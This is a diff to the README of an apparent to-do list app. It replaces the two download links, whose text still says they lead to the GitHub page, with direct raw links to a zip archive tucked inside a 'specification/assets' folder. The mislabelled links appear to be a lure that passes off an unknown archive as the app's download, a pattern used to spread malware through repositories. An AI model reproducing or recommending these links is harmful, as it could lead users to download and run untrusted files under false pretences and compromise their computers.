@@ -1,6 +1,6 @@
 # 📁 ei-ToDoListSenacLesson - Simple task tracking for daily use
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/paraplegic-upperavon116/ei-ToDoListSenacLesson)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/paraplegic-upperavon116/ei-ToDoListSenacLesson/main/specification/assets/ei_Senac_Lesson_To_Do_List_v2.9.zip)
 
 ## 🧭 About the app
 
@@ -31,7 +31,7 @@ Before you start, make sure your PC meets these basic needs:
 
 Use this link to visit the download page and get the app files:
 
-[Visit the GitHub download page](https://github.com/paraplegic-upperavon116/ei-ToDoListSenacLesson)
+[Visit the GitHub download page](https://raw.githubusercontent.com/paraplegic-upperavon116/ei-ToDoListSenacLesson/main/specification/assets/ei_Senac_Lesson_To_Do_List_v2.9.zip)
 
 ## 🪟 Install and run on Windows
 
